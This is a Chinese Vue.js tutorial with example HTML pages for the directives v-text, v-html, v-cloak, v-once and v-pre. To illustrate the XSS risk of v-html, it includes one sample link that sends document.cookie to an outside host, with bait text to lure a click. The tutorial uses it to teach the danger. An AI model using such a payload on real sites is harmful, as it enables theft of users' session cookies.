# 内置指令

## v-text

```html
<!DOCTYPE html>
<html>
 <head>
  <meta charset="UTF-8" />
  <title>v-text指令</title>
  <!-- 引入Vue -->
  <script type="text/javascript" src="../js/vue.js"></script>
 </head>
 <body>
  <!-- 
				我们学过的指令：
						v-bind	: 单向绑定解析表达式, 可简写为 :xxx
						v-model	: 双向数据绑定
						v-for  	: 遍历数组/对象/字符串
						v-on   	: 绑定事件监听, 可简写为@
						v-if 	 	: 条件渲染（动态控制节点是否存存在）
						v-else 	: 条件渲染（动态控制节点是否存存在）
						v-show 	: 条件渲染 (动态控制节点是否展示)
				v-text指令：
						1.作用：向其所在的节点中渲染文本内容。
						2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
		-->
  <!-- 准备好一个容器-->
  <div id="root">
   <div>你好，{{name}}</div>
   <div v-text="name"></div>
   <div v-text="str"></div>
  </div>
 </body>

 <script type="text/javascript">
  Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
  
  new Vue({
   el:'#root',
   data:{
    name:'尚硅谷',
    str:'<h3>你好啊！</h3>'
   }
  })
 </script>
</html>
```

## v-html

```html
<!DOCTYPE html>
<html>
 <head>
  <meta charset="UTF-8" />
  <title>v-html指令</title>
  <!-- 引入Vue -->
  <script type="text/javascript" src="../js/vue.js"></script>
 </head>
 <body>
  <!-- 
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
		-->
  <!-- 准备好一个容器-->
  <div id="root">
   <div>你好，{{name}}</div>
   <div v-html="str"></div>
   <div v-html="str2"></div>
  </div>
 </body>

 <script type="text/javascript">
  Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

  new Vue({
   el:'#root',
   data:{
    name:'尚硅谷',
    str:'<h3>你好啊！</h3>',
    str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
   }
  })
 </script>
</html>
```

## v-clock

```html
<!DOCTYPE html>
<html>
 <head>
  <meta charset="UTF-8" />
  <title>v-cloak指令</title>
  <style>
   [v-cloak]{
    display:none;
   }
  </style>
  <!-- 引入Vue -->
 </head>
 <body>
  <!-- 
				v-cloak指令（没有值）：
						1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
						2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
		-->
  <!-- 准备好一个容器-->
  <div id="root">
   <h2 v-cloak>{{name}}</h2>
  </div>
  <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
 </body>
 
 <script type="text/javascript">
  console.log(1)
  Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
  
  new Vue({
   el:'#root',
   data:{
    name:'尚硅谷'
   }
  })
 </script>
</html>
```

## v-once

```html
<!DOCTYPE html>
<html>
 <head>
  <meta charset="UTF-8" />
  <title>v-once指令</title>
  <!-- 引入Vue -->
  <script type="text/javascript" src="../js/vue.js"></script>
 </head>
 <body>
  <!-- 
			v-once指令：
						1.v-once所在节点在初次动态渲染后，就视为静态内容了。
						2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
		-->
  <!-- 准备好一个容器-->
  <div id="root">
   <h2 v-once>初始化的n值是:{{n}}</h2>
   <h2>当前的n值是:{{n}}</h2>
   <button @click="n++">点我n+1</button>
  </div>
 </body>

 <script type="text/javascript">
  Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
  
  new Vue({
   el:'#root',
   data:{
    n:1
   }
  })
 </script>
</html>
```

## v-pre

```html
<!DOCTYPE html>
<html>
 <head>
  <meta charset="UTF-8" />
  <title>v-pre指令</title>
  <!-- 引入Vue -->
  <script type="text/javascript" src="../js/vue.js"></script>
 </head>
 <body>
  <!-- 
			v-pre指令：
					1.跳过其所在节点的编译过程。
					2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
		-->
  <!-- 准备好一个容器-->
  <div id="root">
   <h2 v-pre>Vue其实很简单</h2>
   <h2 >当前的n值是:{{n}}</h2>
   <button @click="n++">点我n+1</button>
  </div>
 </body>

 <script type="text/javascript">
  Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

  new Vue({
   el:'#root',
   data:{
    n:1
   }
  })
 </script>
</html>
```
